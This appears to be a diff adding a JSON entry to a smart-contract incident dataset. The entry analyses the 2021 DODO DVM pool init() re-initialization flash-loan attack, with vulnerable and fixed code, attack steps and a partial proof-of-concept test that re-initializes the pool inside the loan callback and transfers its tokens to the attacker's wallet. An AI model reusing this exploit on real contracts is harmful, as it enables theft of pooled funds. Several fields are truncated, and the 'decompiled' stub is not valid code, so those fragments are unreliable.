@@ -1,0 +1,35 @@
+{
+ "id": "2021__2021-03-09_DODO_FlashLoan_ReInit",
+ "source_file": "2021/2021-03-09_DODO_FlashLoan_ReInit.md",
+ "title": "DODO Finance — DVM.init() Re-initialization Flash Loan Vulnerability Analysis",
+ "date": "2021-03-09",
+ "protocol": "DODO Finance",
+ "chain": "Ethereum",
+ "loss_raw": "~$3,800,000 (wCRES + USDT)",
+ "loss_usd": 3800000.0,
+ "root_cause": "DVM.init() function lacks an `initialized` flag, allowing it to be called again at any time",
+ "attack_tx": "0x3956...221e (block 12,000,165)",
+ "vulnerable_contract": "0x051EBD717311350f1684f89335bed4ABd083a2b6 (DVM Pool)",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "// ❌ DODO DVM Pool @ 0x051EBD717311350f1684f89335bed4ABd083a2b6\n// init() lacks logic to prevent re-calling on an already-initialized pool\nfunction init(\n    address maintainer,\n    address baseTokenAddress,\n    address quoteTokenAddress,\n    uint256 lpFeeRate,\n    address mtFeeRateModel,\n    uint256 i,\n    uint256 k,\n    bool isOpenTWAP\n) external {\n    // No initialized flag check\n    _BASE_TOKEN_ = IERC20(baseTokenAddress);\n    _QUOTE_TOKEN_ = IERC20(quoteTokenAddress);\n    _LP_FEE_RATE_ = lpFeeRate;\n    // ...\n}",
+  "// ❌ Root Cause: DVM.init() function lacks an initialized flag, allowing re-call at any time\n// ⚠️ Source for the vulnerable function `init()` is not in this file\n// (Located in a Diamond pattern Facet or proxy implementation)\n// SPDX-License-Identifier: UNLICENSED\n// Source unverified — reverse engineered from bytecode\n// Original: 0x051EBD717311350f1684f89335bed4ABd083a2b6 (Ethereum)\n// Reverse engineering method: function selector extraction + 4byte.directory decoding\n\npragma solidity ^0.8.0;\n\ncontract DVM Pool_Decompiled {\n}"
+ ],
+ "code_after": [
+  "// ✅ Manage initialization state with a flag\nbool private _initialized;\n\nfunction init(\n    address maintainer,\n    address baseTokenAddress,\n    address quoteTokenAddress,\n    uint256 lpFeeRate,\n    address mtFeeRateModel,\n    uint256 i,\n    uint256 k,\n    bool isOpenTWAP\n) external {\n    require(!_initialized, \"DVM: already initialized\");\n    _initialized = true;\n    _BASE_TOKEN_ = IERC20(baseTokenAddress);\n    _QUOTE_TOKEN_ = IERC20(quoteTokenAddress);\n    _LP_FEE_RATE_ = lpFeeRate;\n    // ...\n}",
+  "// ✅ Restrict init() to a single execution using the initializer pattern\n// OpenZeppelin Initializable is recommended\n\nimport \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\ncontract DVMPool is Initializable {\n    function init(\n        address maintainer,\n        address baseTokenAddress,\n        address quoteTokenAddress,\n        uint256 lpFeeRate,\n        address mtFeeRateModel,\n        uint256 i,\n        uint256 k,\n        bool isOpenTWAP\n    ) external initializer {  // modifier blocks duplicate calls\n        _BASE_TOKEN_ = IERC20(baseTokenAddress);\n        _QUOTE_TOKEN_ = IERC20(quoteTokenAddress);\n        // ...\n    }\n}"
+ ],
+ "steps": [
+  "Step 1: DVM.flashLoan(130000e18 wCRES, 1100000e6 USDT, ...)",
+  "Step 2: dvm.init() re-called inside the callback",
+  "→ Pool's baseToken/quoteToken replaced with attacker-",
+  "Step 3: Original wCRES + USDT transferred to attacker wallet",
+  "Step 4: Flash loan \"repaid\" against the re-initialized pool"
+ ],
+ "other_code": [
+  "┌──────────────────────────────────────────────────────────────┐\n│ Step 1: DVM.flashLoan(130000e18 wCRES, 1100000e6 USDT, ...) │\n│ DVM Pool @ 0x051EBD717311350f1684f89335bed4ABd083a2b6       │\n└─────────────────────┬────────────────────────────────────────┘\n                      │ DVMFlashLoanCall() callback entered\n┌─────────────────────▼────────────────────────────────────────┐\n│ Step 2: dvm.init() re-called inside the callback             │\n│ init(maintainer, token1, token2, lpFeeRate, ...)             │\n│ → Pool's baseToken/quoteToken replaced with attacker-        │\n│   controlled tokens                                          │\n└─────────────────────┬────────────────────────────────────────┘\n                      │\n┌─────────────────────▼────────────────────────────────────────┐\n│ S",
+  "// testExploit() — mainnet fork block 12,000,000\nfunction testExploit() public {\n    address me = address(this);\n    // Initiate flash loan: 130,000 wCRES + 1,100,000 USDT\n    dvm.flashLoan(wCRES_amount, usdt_amount, me, \"whatever\");\n}\n\nfunction DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public {\n    // Re-call dvm.init() inside flash loan callback — overwrite pool configuration\n    dvm.init(\n        maintainer,\n        token1,   // 0x7f4E7fB900E0EC043718d05caEe549805CaB22C8 (attacker token)\n        token2,   // 0xf2dF8794f8F99f1Ba4D8aDc468EbfF2e47Cd7010 (attacker token)\n        lpFeeRate,\n        mtFeeRateModel,\n        i, k, isOpenTWAP\n    );\n    // Drain original funds\n    wCRES_token.transfer(mywallet, wCRES_token.balanceOf(address(this)));\n    usdt_token.transfe"
+ ]
+}
